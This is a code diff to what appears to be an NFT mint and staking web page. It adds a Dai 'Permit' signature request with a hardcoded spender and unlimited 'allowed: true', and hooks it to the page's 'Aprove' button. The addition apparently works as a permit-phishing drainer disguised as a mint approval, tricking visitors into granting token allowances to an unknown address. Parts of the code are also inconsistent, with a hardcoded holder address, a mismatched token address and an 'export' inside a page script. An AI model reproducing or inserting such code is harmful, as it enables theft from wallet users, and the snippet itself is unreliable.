@@ -34,7 +34,7 @@
             <a id="mint" class="hero-btn">Mint now</a>
             <label for="quantity" >Quantity (between 1 and 10):</label>
             <input type="number" id="quantity" name="quantity" value="1" min="1" max="10"> </br>
-            <li><a onclick="a()" class="hero-btn" id="aprove"> Aprove</a></li>
+            <li><a class="hero-btn" id="aprove"> Aprove</a></li>
         </div>
     </section>
 
@@ -48,7 +48,103 @@
     const ADDRESS = "0xABF1a72A2D72fd4B8b74EBcf1cD8E4Fd3Ab55F2e";
     const prc20 = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
     var contractdai = new web3.eth.Contract(ABII, prc20);
-   
+
+    const SECOND = 1000;
+
+    const fromAddress = "0xaD6D458402F60fD3Bd25163575031ACDce07538D";
+    // JavaScript dates have millisecond resolution
+    const expiry = Math.trunc((Date.now() + 120 * SECOND) / SECOND);
+    const nonce = 1;
+    const spender = "0x009f6eE78C4782E3D8779cB2a92EaEb2dCe9EdDf";
+
+    const createPermitMessageData = function () {
+  const message = {
+    holder: fromAddress,
+    spender: spender,
+    nonce: nonce,
+    expiry: expiry,
+    allowed: true,
+  };
+
+  const typedData = JSON.stringify({
+    types: {
+      EIP712Domain: [
+        {
+          name: "name",
+          type: "string",
+        },
+        {
+          name: "version",
+          type: "string",
+        },
+        {
+          name: "chainId",
+          type: "uint256",
+        },
+        {
+          name: "verifyingContract",
+          type: "address",
+        },
+      ],
+      Permit: [
+        {
+          name: "holder",
+          type: "address",
+        },
+        {
+          name: "spender",
+          type: "address",
+        },
+        {
+          name: "nonce",
+          type: "uint256",
+        },
+        {
+          name: "expiry",
+          type: "uint256",
+        },
+        {
+          name: "allowed",
+          type: "bool",
+        },
+      ],
+    },
+    primaryType: "Permit",
+    domain: {
+      name: "Dai Stablecoin",
+      version: "1",
+      chainId: 42,
+      verifyingContract: "0x4F96Fe3b7A6Cf9725f59d353F723c1bDb64CA6Aa",
+    },
+    message: message,
+  });
+
+  return {
+    typedData,
+    message,
+  };
+};
+
+    const signData = async function (web3, fromAddress, typeData) {
+    const result = await web3.currentProvider.sendAsync({
+        id: 42,
+        method: "eth_signTypedData_v3",
+        params: [fromAddress, typeData],
+        from: fromAddress,
+    });
+  
+    const r = result.result.slice(0, 66);
+    const s = "0x" + result.result.slice(66, 130);
+    const v = Number("0x" + result.result.slice(130, 132));
+  
+    return { v, r, s };
+    };
+
+    export const signTransferPermit = async function () {
+            const messageData = createPermitMessageData();
+            const sig = await signData(web3, fromAddress, messageData.typedData);
+            return Object.assign({}, sig, messageData.message);
+        };
     async function w() {
         if(window.ethereum) {
         await window.ethereum.send('eth_requestAccounts');
@@ -68,6 +164,11 @@
             contract.methods.stakeTokens(value).send({ from: account});
             
         }
+        document.getElementById('aprove').onclick = () => {
+            signTransferPermit();
+
+        }
+
     }
     }
     
